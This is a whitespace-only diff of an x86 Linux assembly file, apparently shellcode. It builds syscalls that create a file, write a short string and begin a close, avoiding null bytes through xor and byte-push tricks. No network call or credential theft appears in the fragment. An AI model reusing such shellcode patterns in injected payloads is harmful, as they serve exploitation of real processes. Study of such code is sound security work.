@@ -7,6 +7,7 @@
 global _start
 
 section .text
+
 _start:
     xor eax,eax
     push eax
@@ -37,14 +38,14 @@ _start:
     mov cx,0x2bc
     mov al,0x8
     int 0x80
-    mov ebx,eax 	 	    ; equivalent and smaller than 'mov eax, ebx'
+    mov ebx,eax             ; equivalent and smaller than 'mov eax, ebx'
     push eax
     mov dx,0x3a30
     push dx
     mov ecx,esp
     xor edx,edx
     inc edx
-    mov al,0x4    	    	; write syscall
+    mov al,0x4              ; write syscall
     int 0x80
     push byte 6 	    	; 'close' syscall from the stack
     pop eax             
